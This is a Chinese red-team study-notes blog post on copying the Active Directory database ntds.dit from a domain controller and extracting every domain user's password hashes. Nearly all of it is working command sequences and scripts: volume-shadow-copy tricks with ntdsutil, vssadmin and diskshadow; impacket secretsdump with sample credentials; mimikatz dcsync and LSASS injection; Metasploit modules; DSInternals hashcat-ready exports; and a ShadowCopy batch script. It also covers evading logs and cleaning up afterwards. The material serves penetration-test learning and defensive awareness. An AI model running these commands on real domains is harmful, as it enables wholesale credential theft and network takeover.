---
title: 【内网学习笔记】26、ntds.dit 的提取与散列值导出
date: 2021-09-09 21:51:10
id: 210909-215110
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908155944.png
tags:
- 红队
- 学习笔记
- 内网
categories:
- 内网学习笔记
---

## 0、前言

在活动目录中，所有数据都保存在 ntds.dit 文件中，ntds.dit 是一个二进制文件，存储位置为域控的 %SystemRoot%\\ntds.dit

ntds.dit 中包含（但不限于）用户名、散列值、组、GPP、OU 等与活动目录相关的信息，因此如果我们拿到 ntds.dit 就能获取到域内所有用户的 hash

在通常情况下，即使拥有管理员权限，也无法读取域控中的 ntds.dit 文件（因为活动目录始终访问这个文件，所以文件被禁止读取），它和 SAM 文件一样，是被 Windows 操作系统锁定的。

不过使用 Windows 本地卷影拷贝服务，就可以获得文件的副本（类似于虚拟机的快照）

## 1、使用卷影拷贝服务提取 ntds.dit

### ntdsutil

ntdsutil 是一个为活动目录提供管理机制的命令行工具，使用 ntdsutil 可以维护和管理活动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPromo.exe）成功降级的与控制器留下的元数据等。

该工具默认安装在域控上，使用以下命令创建一个快照，该快照包含 Windows 中的所有文件，且在复制文件时不会受到 Windows 锁定机制的限制。

```
ntdsutil snapshot "activate instance ntds" create quit quit
```

加载刚刚创建的快照

```
ntdsutil snapshot "mount {ce2f5901-022f-4c21-b266-b4c14db67749}" quit quit
```

使用 copy 命令将快照中的文件复制到 C 盘下

```
copy C:\$SNAP_202109081356_VOLUMEC$\windows\NTDS\ntds.dit C:\ntds.dit
```

删除之前加载的快照

```
ntdsutil snapshot "unmount {ce2f5901-022f-4c21-b266-b4c14db67749}" "delete {ce2f5901-022f-4c21-b266-b4c14db67749}" quit quit
```

查询当前系统中的快照，可以看到没有任何快照

```
ntdsutil snapshot "List All" quit quit
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908135855.png)

### vssadmin

vssadmin 可用于创建和删除卷影拷贝、列出卷影的信息（只能管理系统 Provider 创建的卷影拷贝）、显示已安装的所有卷影拷贝写入程序（writers）和提供程序（providers），以及改变卷影拷贝的存储空间（即所谓的 “diff 空间”）的大小等。

vssadmin 的使用流程和 ntdsutil 差不多，首先创建一个 C 盘的卷影拷贝

```
vssadmin create shadow /for=C:
```

在创建的卷影拷贝中将 ntds.dit 复制出来

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit C:\ntds.dit
```

删除快照

```
vssadmin delete shadows /for=C: /quiet
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908145721.png)

### vssown.vbs

vssown.vbs 脚本的功能和 vssadmin 类似，可用于创建和删除卷影拷贝以及启动和停止卷影拷贝服务。

vssown.vbs 下载地址：[https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs](https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs)

启动卷影拷贝服务

```
cscript vssown.vbs /start
```

创建一个 C 盘的卷影拷贝

```
cscript vssown.vbs /create c
```

列出当前卷影拷贝

```
cscript vssown.vbs /list
```

复制 ntds.dit

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy14\windows\NTDS\ntds.dit C:\ntds.dit
```

删除卷影拷贝

```
cscript vssown.vbs /delete {22B93FE6-D53A-4ECA-BD5A-7A2A68203EF8}
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908152359.png)

### IFM

除了上面介绍的通过执行命令来提取 ntds.dit，也可以通过创建一个 IFM 的方式获取 ntds.dit

在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。

在域控中以管理员模式打开命令行环境，输入命令

````
ntdsutil "ac i ntds" "ifm" "create full c:/test" q q
````

此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下

将 ntds.dit 拖回本地后，在目标机器上将 test 文件夹删除

```
rmdir /s/q C:\test
```

### Copy-VSS.ps1

nishang 工具包里的 Copy-VSS.ps1 也可以将 ntds.dit 提取出来，nishang 工具包地址：[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

```
Import-Module .\Copy-VSS.ps1
Copy-vss
或者
PowerShell -Exec bypass -C "Import-module .\Copy-VSS.ps1;Copy-vss"
```

通过该脚本，可以将 SAM、SYSTEM，ntds.dit 复制到与 ps1 脚本相同的目录下。

### diskshadow

diskshadow 和 vshadow 功能类似，不过 vshadow 是包含在 Windows SDK 里的，因此实际应用的时候还需要将其上传到目标机器上。

> diskshadow 有交互模式和非交互模式，在使用交互模式时，需要在图形化界面里操作

首先创建一个 txt 文件，内容如下：

```
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% k:
exec "C:\windows\system32\cmd.exe" /c copy k:\Windows\NTDS\ntds.dit C:\ntds.dit
delete shadows all
list shadows all
reset
exit
```

使用 diskshadow 调用刚才的文本文件

```
diskshadow /s C:\command.txt
```

因为 system.hive 里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容

```
reg save hklm\system c:\windows\temp\system.hive
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908155944.png)

### Invoke-NinjaCopy.ps1

PowerSploit 工具包里的 Invoke-NinjaCopy.ps1 脚本也可以提取 ntds.dit 文件，这种方法没有调用 Volume Shadow Copy 服务，所以不会产生日志文件

PowerSploit 工具包项目地址：[https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

```
Import-Module .\Invoke-NinjaCopy.ps1
Invoke-NinjaCopy -Path "C:\windows\ntds\ntds.dit" -LocalDestination "C:\ntds.dit"
```

### impacket

impacket 安装

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
python3 setup.py install
```

通过 impacket  里的 secretsdump.py 脚本可以直接远程读取 ntds.dit 并导出哈希值

```
cd ./build/scripts-3.9
python3 secretsdump.py teamssix.com/administrator:1qaz@WSX@192.168.7.7 -outputfile output_ntds
```

## 2、导出 ntds.dit 文件中的散列值

### esedbexport

安装 esedbexport，以 Kali 为例

```
apt-get install autoconf automake autopoint libtool pkg-config
wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb-experimental-20210424.tar.gz
tar zxvf libesedb-experimental-20210424.tar.gz
cd libesedb-20210424
./configure
make
make install
ldconfig
```

导出 ntds.dit

```
esedbexport -m tables ntds.dit
```

安装 ntdsxtract

```
git clone https://github.com/csababarta/ntdsxtract.git
cd ntdsxtract
python setup.py build
python setup.py install
```

将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 all_user.txt 里

```
python2 dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile atout --lmoutfile lmout | tee all_user.txt
```

> 如果提示 ImportError: No module named Crypto.Hash，直接 pip install pycryptodome 即可

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/20210908171420.png)

ntds.dit 包含域内的所有信息，可以通过分析 ntds.dit 导出域内的计算机信息以及其他信息，最后结果将保存在 all_computers.csv 文件内

```
python2 dscomputers.py ntds.dit.export/datatable.3 computer_output --csvoutfile all_computers.csv
```

### impacket

将 ntds.dit.export 和 SYSTEM 文件放入到 impacket 工具的文件夹中

```
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
```

或者直接使用 python 执行 secretsdump.py 文件

```
cd ./build/scripts-3.9
python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```

### NTDSDump.exe

NTDSDumpEx.exe 可以进行导出哈希值的操作，下载地址：[https://github.com/zcgonvh/NTDSDumpEx/releases](https://github.com/zcgonvh/NTDSDumpEx/releases)

```
NTDSDumpEx -d ntds.dit -s system -o domain.txt
```

### mimikatz

mimikatz 有个 dcsync 的功能，可以利用卷影拷贝服务直接读取 ntds.dit 文件，不过需要管理员权限。

导出域内所有用户的用户名和哈希值

```
lsadump::dcsync /domain:teamssix.com /all /csv
```

导出域内指定用户的用户名和哈希值

```
lsadump::dcsync /domain:teamssix.com /user:administrator
```

也可以通过转储 lsass.exe 进行 dump 操作

```
privilege::debug
lsadump::lsa /inject
```

> 如果输出内容太多，可以使用 log 命令，这样操作就都会被记录到文本里了

### Invoke-DCSync.ps1

该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值

Invoke-DCSync.ps1 下载地址：[https://gist.github.com/monoxgas/9d238accd969550136db](https://gist.github.com/monoxgas/9d238accd969550136db)

```
Import-Module ./Invoke-DCSync.ps1
Invoke-DCSync -PWDumpFormat
```

### MSF

msf 里的 psexec_ntdsgrab 可以获取目标的 ntds.dit 和 SYSTEM 并将其保存到 /root/.msf4/loot/ 目录下 

```
use auxiliary/admin/smb/psexec_ntdsgrab
set rhosts 192.168.7.7
set smbdomain teamssix.com
set smbuser administrator
set smbpass 1qaz@WSX
run
```

除此之外，在获取到会话后，也可以直接用 MSF 提供的模块获取 ntds.dit

```
use windows/gather/credentials/domain_hashdump
set session 1
run
```

> 注意生成的 payload 需要和目标系统位数一致，不然会报错

### DSInternals

DSInternals 主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。

DSInternals 下载地址：[https://github.com/MichaelGrafnetter/DSInternals/releases](https://github.com/MichaelGrafnetter/DSInternals/releases)

安装 DSInternals

```
Install-Module DSInternals -Force
```

直接导出 hash，并保存在 output_hash.txt 文件里

```
$key = Get-Bootkey -SystemHivePath 'C:\system'
Get-ADDBAccount -All -DBPath 'C:\ntds.dit' -Bootkey $key | Out-File output_hash.txt
```

或者导出 hashcat 支持的 hash，并保存在 output_hashcat.txt 文件里

```
$key = Get-Bootkey -SystemHivePath 'C:\system.hive'
Get-ADDBAccount -All -DBPath 'C:\ntds.dit' -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt
```

### vshaow 和 QuarksPwDump

在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。

如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。

QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。

QuarksPwDump 下载地址：[https://github.com/tuthimi/quarkspwdump/tree/master/Release](https://github.com/tuthimi/quarkspwdump/tree/master/Release)

ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下

```
setlocal
if NOT "%CALLBACK_SCRIPT%"=="" goto :IS_CALLBACK
set SOURCE_DRIVE_LETTER=%SystemDrive%
set SOURCE_RELATIVE_PATH=windows\ntds\ntds.dit
set DESTINATION_PATH=%~dp0
@echo ...Determine the scripts to be executed/generated...
set CALLBACK_SCRIPT=%~dpnx0
set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd
@echo ...Creating the shadow copy...
"%~dp0vshadow.exe" -script=%TEMP_GENERATED_SCRIPT% -exec="%CALLBACK_SCRIPT%" %SOURCE_DRIVE_LETTER%
del /f %TEMP_GENERATED_SCRIPT%
@goto :EOF
:IS_CALLBACK
setlocal
@echo ...Obtaining the shadow copy device name...
call %TEMP_GENERATED_SCRIPT%
@echo ...Copying from the shadow copy to the destination path...
copy "%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%" %DESTINATION_PATH%
reg save hklm\system system.hive
```

vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：[https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/](https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/)

Windows SDK 下载安装完后，找到 vshadow.exe ，我这里的路径是：

```
C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\x64\vsstools\vshadow.exe
```

将这三个文件放到同一个文件夹里后，运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件

使用 esentutl 修复导出的 ntds.dit 文件

```
esentutl /p /o ntds.dit
```

最后通过 QuarksPwDump.exe 导出域账号和散列值

```
QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt
```

在 log 里就能看到导出的密码哈希了

> 参考文章：
>
> [https://cloud.tencent.com/developer/article/1752212](https://cloud.tencent.com/developer/article/1752212)
>
> [https://www.freebuf.com/articles/network/251267.html](https://www.freebuf.com/articles/network/251267.html)
>
> [https://blog.csdn.net/qq_45742511/article/details/117301437](https://blog.csdn.net/qq_45742511/article/details/117301437)
>
> [https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/](https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)
